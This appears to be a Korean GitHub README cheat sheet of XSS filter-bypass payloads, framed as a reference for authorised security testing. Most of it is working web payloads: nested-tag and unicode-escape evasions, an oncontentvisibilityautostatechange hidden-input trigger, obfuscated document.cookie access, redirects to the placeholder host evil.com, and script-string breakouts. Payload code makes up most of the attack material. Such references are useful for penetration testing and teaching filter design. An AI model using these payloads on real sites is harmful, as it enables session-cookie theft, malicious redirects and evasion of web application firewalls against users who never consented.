# XSS-Bypass-CheatSheet
정리된 **XSS 필터 우회 페이로드**와 **보안 점검 시 활용 가능한 기법 모음**입니다.  
XSS 취약점 점검을 위한 **필터 우회 구문** 및 **케이스별 정리**를 포함합니다.

---

## 📂 구성 내용

- ✅ 필터 우회용 XSS 페이로드 모음
- ✅ 상황별(WAF, 입력 값 검증 우회 등) 우회 기법 정리
- ✅ 실전 점검에서 활용된 사례 기반 정리
---


## 🛡️ 책임 한계 및 유의사항
> 이 저장소에 포함된 모든 XSS 필터 우회 구문과 기법은 **보안 점검 및 교육 목적**으로만 제공됩니다.  
> 실제 시스템이나 타인의 서비스에 **무단으로 테스트하거나 악용하는 것은 법적인 책임을 초래할 수 있으며**,  
> 이에 따른 모든 책임은 사용자 본인에게 있습니다.  
> 본 저장소의 내용을 사용함으로써 발생하는 **직·간접적인 피해에 대해 작성자는 어떠한 책임도 지지 않습니다.**
---


## 🔍 XSS 개요

XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 사용자의 브라우저에서 실행되도록 유도하는 취약점입니다. 주로 사용자 입력값을 적절히 검증하거나 이스케이프하지 않을 경우 발생합니다.

### 종류
- **Reflected XSS**: URL 등에 포함된 스크립트가 바로 반영되어 실행됨
- **Stored XSS**: 데이터베이스 등에 저장된 스크립트가 나중에 실행됨
- **DOM-based XSS**: 클라이언트 측 자바스크립트 로직에서 발생함

## 💣 CASE별 우회 기법

### 1. 태그 분할 및 중첩 우회 (Broken/Nested Tag Bypass)

필터가 단순히 script 문자열이 삭제되는 경우, scscriptript 또는 scrscriptipt 등의 형태로 필터를 우회할 수 있습니다.
💡 예시
```
<scscriptript></scriscriptpt>
```

---

### 2. hidden 필드 내 태그 탈출이 불가능한 경우(Hidden Input Field Payload)
\<input type="hidden"\> 등의 폼 필드 내 속성에서 이벤트 핸들러를 통한 실행을 유도하는 방식입니다.
2024년 7월에 등장한 새로운 우회 기법으로, oncontentvisibilityautostatechange 이벤트를 이용해 사용자 인터랙션 없이 XSS를 트리거할 수 있습니다. 이 기법은 Chrome Canary 및 최신 버전의 Chrome에서 작동하며, 기존 XSS 필터링을 우회하는 데 활용될 수 있습니다.
💡 예시
```
<input type="hidden" oncontentvisibilityautostatechange="alert(/TEST/)" style="content-visibility:auto">
```

---

### 3. 유니코드 인코딩 우회 (함수 호출 필터 우회)
웹 방화벽(WAF)이나 필터링 로직이 alert(), confirm() 등의 특정 함수 호출 문자열만 필터링할 경우, 유니코드 이스케이프를 사용하여 탐지를 우회할 수 있습니다. 이벤트 핸들러 자체는 허용되지만 내부 함수 호출만 제한하는 상황에서 효과적입니다.

💡 예시
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\u0063onfirm(1)">
```
위 코드는 각각 alert(1), confirm(1)을 유니코드로 표현하여 필터를 우회합니다.
\u0061 → a, \u0063 → c 이므로 최종적으로는 alert() 및 confirm()과 동일하게 동작합니다.

---

### 4. document.cookie 접근 우회 (속성 인덱싱 우회)
일부 필터는 document.cookie라는 문자열을 정적으로 탐지하여 차단합니다.
이럴 경우, 속성 접근을 문자열 인덱싱 방식으로 우회할 수 있습니다.

💡 예시
```
<script>alert(document['cookie'])</script>
<script>alert(document['c'+'ookie'])</script>
<script>alert(document[String.fromCharCode(99,111,111,107,105,101)])</script>
```
위 코드는 모두 document.cookie와 동일하게 작동하지만, 문자열 결합 또는 유니코드로 표현되어 필터링을 회피합니다.

 ---
 
### 5. location.href 관련 우회 (리디렉션 함수 다양화)
필터가 location.href만 막을 경우, 동일한 효과를 가진 다른 속성 또는 메서드를 활용해 우회가 가능합니다.

### 💡 예시
```
location.href = 'https://evil.com'
location['href'] = 'https://evil.com'
location.assign('https://evil.com')
location['assign']('https://evil.com')
location.replace('https://evil.com')
window.location='https://evil.com'
top.location='https://evil.com'
window.top.location='https://evil.com'
```
### 📝 설명  
location.assign() : 새 페이지로 이동 (기록 남음)  
location.replace() : 새 페이지로 이동 (기록 남지 않음, back 불가)  
location['assign']() : 필터 우회용 문자열 분리  
window.location : 전역 객체 접근으로 우회 가능

---

### 6. <script> 태그 내 문자열 우회 (String Context Injection)
웹 애플리케이션이 <script> 태그 내에서 사용자 입력을 문자열로 삽입할 경우, 이를 활용한 다양한 우회 기법이 존재합니다.

### 💡 예시 (정상 출력 예상)
```
<script>
  var msg = "Hello USER_INPUT!";
</script>
```

### 💡 예시(공격자가 USER_INPUT에 아래와 같은 값을 입력할 경우)
### ✅ 문자열 닫기 + 코드 삽입 + 재닫기
```
";alert(1);//
```
### 최종 결과:
```
<script>
  var msg = "";alert(1);//";
</script>
```
  
### ✅ 다양한 연산자/패턴을 활용한 실행
### 패턴 설명
"aaaa"*alert()*"aaaa"	곱셈 연산자 활용 – 실행 후 NaN 반환되지만 alert()은 실행됨  
"aaaa"/alert()/"aaaa"	나눗셈 연산자 활용  
"aaaa"-alert()-"aaaa"	뺄셈 연산자 활용  
"aaaa"^alert()^"aaaa"	XOR 연산자 활용  
"aaaa"+alert()+"aaaa"	문자열 + alert 함수 결합 (NaN 포함 가능)  

### 💡 예시:
```
<script>
  var a = "aaaa"*alert(1)*"aaaa";
  var a = "aaaa"/alert(1)/"aaaa";
  var a = "aaaa"-alert(1)-"aaaa";
  var a = "aaaa"^alert(1)^"aaaa";
  var a = "aaaa"+alert(1)+"aaaa";
</script>
```

### ✅ HTML Escape 우회 목적의 <script> 중첩 삽입
### 💡 예시
```
<script>
  var payload = "aaa<script>alert(1)</script>aaa";
</script>
```
💡 위 방식은 서버 측에서 "..aaa<script>alert(1)</script>aaa.." 문자열에 사용자 입력을 넣는 경우에만 작동하며, 필터링이 허술할 때 위험합니다.
